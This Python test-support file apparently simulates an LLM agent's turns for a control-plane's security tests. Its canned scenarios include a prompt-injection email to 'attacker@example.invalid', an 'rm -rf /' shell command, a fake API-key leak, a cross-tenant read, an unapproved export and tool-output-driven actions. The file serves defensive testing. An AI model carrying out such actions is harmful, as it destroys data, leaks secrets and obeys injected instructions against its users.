"""Simulated LLM agent core producing deterministic untrusted outputs."""

from agent_control_plane.models import (
    AgentRequest,
    ContextTrust,
    ModelTurnResult,
    Provenance,
    ProvenanceSource,
    ToolCallPayload,
)
from agent_control_plane.prompt import assemble_prompt


def run_simulated_agent(request: AgentRequest) -> ModelTurnResult:
    """
    Produce model output for a scenario without calling external LLMs.

    Invariant: all model output is untrusted; scenarios exist for deterministic tests only.
    """
    _ = assemble_prompt(request)
    scenario = request.scenario

    if scenario == "safe_read":
        return ModelTurnResult(
            natural_language="I will read records for this tenant.",
            tool_call=ToolCallPayload(
                tool_name="read_records",
                arguments={"record_ids": ["r-100"]},
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.MODEL,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["model-turn"],
                ),
            ),
        )

    if scenario == "injection_send_email":
        return ModelTurnResult(
            natural_language="Following retrieved instructions to notify the user.",
            tool_call=ToolCallPayload(
                tool_name="send_email",
                arguments={
                    "to": "attacker@example.invalid",
                    "subject": "Exported data",
                    "body": "See attachment",
                },
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.RETRIEVED,
                    trust=ContextTrust.UNTRUSTED,
                    context_ids=["rag-inject-1"],
                ),
            ),
        )

    if scenario == "shell_attempt":
        return ModelTurnResult(
            natural_language="Running maintenance command.",
            tool_call=ToolCallPayload(
                tool_name="run_shell",
                arguments={"command": "rm -rf /"},
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.MODEL,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["model-turn"],
                ),
            ),
        )

    if scenario == "export_no_approval":
        return ModelTurnResult(
            natural_language="Exporting all tenant records.",
            tool_call=ToolCallPayload(
                tool_name="export_records",
                arguments={"format": "csv"},
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.MODEL,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["model-turn"],
                ),
            ),
        )

    if scenario == "send_email_approved":
        return ModelTurnResult(
            natural_language="Sending email with human approval.",
            tool_call=ToolCallPayload(
                tool_name="send_email",
                arguments={
                    "to": "user@example.invalid",
                    "subject": "Notice",
                    "body": "Hello",
                },
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.MODEL,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["model-turn"],
                ),
            ),
        )

    if scenario == "internal_reviewed_read":
        return ModelTurnResult(
            natural_language="Reading records from internal reviewed context.",
            tool_call=ToolCallPayload(
                tool_name="read_records",
                arguments={"record_ids": ["r-internal-1"]},
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.INTERNAL_REVIEWED,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["review-42"],
                ),
            ),
        )

    if scenario == "export_approved":
        return ModelTurnResult(
            natural_language="Exporting records with approval.",
            tool_call=ToolCallPayload(
                tool_name="export_records",
                arguments={"format": "json"},
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.MODEL,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["model-turn"],
                ),
            ),
        )

    if scenario == "output_secret_leak":
        return ModelTurnResult(
            natural_language=(
                "Here is the API key you asked for: "
                "sk-live-FAKE-TEST-ONLY-abcdef0123456789abcdef0123456789"
            ),
            tool_call=None,
        )

    if scenario == "cross_tenant_read":
        return ModelTurnResult(
            natural_language="Reading records from another tenant.",
            tool_call=ToolCallPayload(
                tool_name="read_records",
                arguments={"record_ids": ["r-200"]},
                target="tenant-other",
                provenance=Provenance(
                    source=ProvenanceSource.MODEL,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["model-turn"],
                ),
            ),
        )

    if scenario == "missing_provenance":
        return ModelTurnResult(
            natural_language="Read without provenance metadata.",
            tool_call=ToolCallPayload(
                tool_name="read_records",
                arguments={"record_ids": ["r-100"]},
                target=request.tenant_id,
                provenance=None,
            ),
        )

    if scenario == "unknown_tool":
        return ModelTurnResult(
            natural_language="Calling undocumented tool.",
            tool_call=ToolCallPayload(
                tool_name="deploy_malware",
                arguments={},
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.MODEL,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["model-turn"],
                ),
            ),
        )

    if scenario == "invalid_schema":
        return ModelTurnResult(
            natural_language="Sending malformed email request.",
            tool_call=ToolCallPayload(
                tool_name="send_email",
                arguments={"to": "user@example.invalid"},
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.MODEL,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["model-turn"],
                ),
            ),
        )

    if scenario == "tool_output_injection_send_email":
        return ModelTurnResult(
            natural_language="Complying with instructions from prior tool output.",
            tool_call=ToolCallPayload(
                tool_name="send_email",
                arguments={
                    "to": "notify@example.invalid",
                    "subject": "Automated notice",
                    "body": "Per tool output",
                },
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.TOOL_OUTPUT,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["tool-exec-9"],
                ),
            ),
        )

    if scenario == "tool_output_injection_shell":
        return ModelTurnResult(
            natural_language="Running command suggested by tool output.",
            tool_call=ToolCallPayload(
                tool_name="run_shell",
                arguments={"command": "echo simulated"},
                target=request.tenant_id,
                provenance=Provenance(
                    source=ProvenanceSource.TOOL_OUTPUT,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["tool-exec-shell"],
                ),
            ),
        )

    if scenario == "tool_output_cross_tenant":
        return ModelTurnResult(
            natural_language="Reading records referenced in tool output.",
            tool_call=ToolCallPayload(
                tool_name="read_records",
                arguments={"record_ids": ["r-foreign"]},
                target="tenant-other",
                provenance=Provenance(
                    source=ProvenanceSource.TOOL_OUTPUT,
                    trust=ContextTrust.TRUSTED,
                    context_ids=["tool-exec-foreign"],
                ),
            ),
        )

    if scenario == "tool_output_echo_secret":
        return ModelTurnResult(
            natural_language=(
                "Tool output contained credential: "
                "sk-live-FAKE-TEST-ONLY-abcdef0123456789abcdef0123456789"
            ),
            tool_call=None,
        )

    return ModelTurnResult(
        natural_language="No action taken for unknown scenario.",
        tool_call=None,
    )
